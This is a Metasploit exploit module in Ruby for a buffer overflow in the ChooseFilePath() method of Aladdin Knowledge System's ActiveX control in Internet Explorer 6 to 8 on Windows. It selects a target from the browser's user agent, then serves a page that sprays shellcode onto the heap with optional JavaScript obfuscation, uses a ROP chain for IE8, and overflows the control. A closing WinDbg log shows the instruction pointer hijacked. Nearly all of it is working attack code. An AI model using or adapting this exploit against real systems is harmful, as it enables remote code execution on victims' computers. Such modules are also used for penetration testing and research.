# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::HttpServer::HTML
    include Msf::Exploit::Remote::BrowserAutopwn
    include Msf::Exploit::RopDb
 
    autopwn_info({
        :ua_name    => HttpClients::IE,
        :ua_minver  => "6.0",
        :ua_maxver  => "8.0",
        :javascript => true,
        :os_name    => OperatingSystems::WINDOWS,
        :rank       => Rank,
        :classid    => "{09F68A41-2FBE-11D3-8C9D-0008C7D901B6}",
        :method     => "ChooseFilePath",
    })
 
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;           => "Aladdin Knowledge System Ltd ChooseFilePath Buffer Overflow",
            &#039;Description&#039;    => %q{
                    This module exploits a vulnerability found in Aladdin Knowledge System&#039;s
                ActiveX component.  By supplying a long string of data to the ChooseFilePath()
                function, a buffer overflow occurs, which may result in remote code execution
                under the context of the user.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;shinnai&#039;,       #Vulnerability Discovery
                    &#039;b33f&#039;,          #Original exploit
                    &#039;sinn3r&#039;,        #Metasploit
                    &#039;juan vazquez&#039;   #Metasploit, IE8 target
                ],
            &#039;References&#039;     =>
                [
                    [ &#039;OSVDB&#039;, &#039;86723&#039; ],
                    [ &#039;EDB&#039;,   &#039;22258&#039; ],
                    [ &#039;EDB&#039;,   &#039;22301&#039; ]
                ],
            &#039;Payload&#039;        =>
                {
                    &#039;StackAdjustment&#039; => -3500
                },
            &#039;DefaultOptions&#039;  =>
                {
                    &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;Automatic&#039;, {} ],
                    [ &#039;IE 6 on Windows XP SP3&#039;,
                        {
                            &#039;Rop&#039; => false,
                            &#039;Offset&#039; => &#039;0x5F4&#039;,
                            &#039;Ret&#039; => 0x0c0c0c0c
                        }
                    ],
                    [ &#039;IE 7 on Windows XP SP3&#039;,
                        {
                            &#039;Rop&#039; => false,
                            &#039;Offset&#039; => &#039;0x5F4&#039;,
                            &#039;Ret&#039; => 0x0c0c0c0c
                        }
                    ],
                    [ &#039;IE 8 on Windows XP SP3&#039;,
                        {
                            &#039;Rop&#039; => true,
                            &#039;Offset&#039; => &#039;0x5f6&#039;,
                            &#039;Ret&#039; => 0x77c2282e # stackpivot # mov esp,ebp # pop ebp # retn # msvcrt.dll
                        }
                    ],
                    [ &#039;IE 7 on Windows Vista&#039;,
                        {
                            &#039;Rop&#039; => false,
                            &#039;Offset&#039; => &#039;0x5F4&#039;,
                            &#039;Ret&#039; => 0x0c0c0c0c
                        }
                    ]
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => "Apr 1 2012",
            &#039;DefaultTarget&#039;  => 0))
 
        register_options(
            [
                OptBool.new(&#039;OBFUSCATE&#039;, [false, &#039;Enable JavaScript obfuscation&#039;, false])
            ], self.class)
 
    end
 
    def get_target(agent)
        #If the user is already specified by the user, we&#039;ll just use that
        return target if target.name != &#039;Automatic&#039;
 
        nt = agent.scan(/Windows NT (\d\.\d)/).flatten[0] || &#039;&#039;
        ie = agent.scan(/MSIE (\d)/).flatten[0] || &#039;&#039;
 
        ie_name = "IE #{ie}"
 
        case nt
        when &#039;5.1&#039;
            os_name = &#039;Windows XP SP3&#039;
        when &#039;6.0&#039;
            os_name = &#039;Windows Vista&#039;
        when &#039;6.1&#039;
            os_name = &#039;Windows 7&#039;
        end
 
        targets.each do |t|
            if (!ie.empty? and t.name.include?(ie_name)) and (!nt.empty? and t.name.include?(os_name))
                print_status("Target selected as: #{t.name}")
                return t
            end
        end
 
        return nil
    end
 
    def ie_heap_spray(my_target, p)
        js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(target.arch))
        js_nops = Rex::Text.to_unescape("\x0c"*4, Rex::Arch.endian(target.arch))
 
        # Land the payload at 0x0c0c0c0c
 
        js = %Q|
        var heap_obj = new heapLib.ie(0x20000);
        var code = unescape("#{js_code}");
        var nops = unescape("#{js_nops}");
        while (nops.length < 0x80000) nops += nops;
        var offset = nops.substring(0, #{my_target[&#039;Offset&#039;]});
        var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);
        while (shellcode.length < 0x40000) shellcode += shellcode;
        var block = shellcode.substring(0, (0x80000-6)/2);
        heap_obj.gc();
        for (var i=1; i < 0x300; i++) {
            heap_obj.alloc(block);
        }
        var overflow = nops.substring(0, 10);
        |
 
        js = heaplib(js, {:noobfu => true})
 
        if datastore[&#039;OBFUSCATE&#039;]
            js = ::Rex::Exploitation::JSObfu.new(js)
            js.obfuscate
        end
 
        return js
    end
 
    def load_exploit_html(my_target, cli)
 
        if my_target[&#039;Rop&#039;]
            p = generate_rop_payload(&#039;msvcrt&#039;, payload.encoded, {&#039;target&#039;=>&#039;xp&#039;})
        else
            p = payload.encoded
        end
 
        spray = ie_heap_spray(my_target, p)
 
        html = %Q|
        <html>
        <object id="pwnd" classid="clsid:09F68A41-2FBE-11D3-8C9D-0008C7D901B6"></object>
        <script>
        #{spray}
 
        junk=&#039;&#039;;
        for( counter=0; counter<=267; counter++) junk+=unescape("%0c");
        pwnd.ChooseFilePath(junk + "#{Rex::Text.to_hex([my_target.ret].pack("V"))}");
        </script>
        </html>
        |
 
        return html
    end
 
    def on_request_uri(cli, request)
        agent = request.headers[&#039;User-Agent&#039;]
        uri   = request.uri
        print_status("Requesting: #{uri}")
 
        my_target = get_target(agent)
        # Avoid the attack if no suitable target found
        if my_target.nil?
            print_error("Browser not supported, sending 404: #{agent}")
            send_not_found(cli)
            return
        end
 
        html = load_exploit_html(my_target, cli)
        html = html.gsub(/^\t\t/, &#039;&#039;)
        print_status("Sending HTML...")
        send_response(cli, html, {&#039;Content-Type&#039;=>&#039;text/html&#039;})
    end
 
end
 
=begin
0:008> g
(82c.12dc): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=0c0c0c0c ebx=00001d56 ecx=020b93d4 edx=00001d56 esi=00001d60 edi=020b93e8
eip=7712a41a esp=020b93bc ebp=020b93c4 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
OLEAUT32!SysReAllocStringLen+0x31:
7712a41a 8b00            mov     eax,dword ptr [eax]  ds:0023:0c0c0c0c=????????
0:008> g
(82c.12dc): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=0c0c0c0c edx=7c9032bc esi=00000000 edi=00000000
eip=0c0c0c0c esp=020b8fec ebp=020b900c iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
0c0c0c0c ??              ???
0:008> db 020bf798
020bf798  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................
020bf7a8  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................
020bf7b8  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................
020bf7c8  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................
020bf7d8  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................
020bf7e8  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................
020bf7f8  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................
020bf808  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................
=end

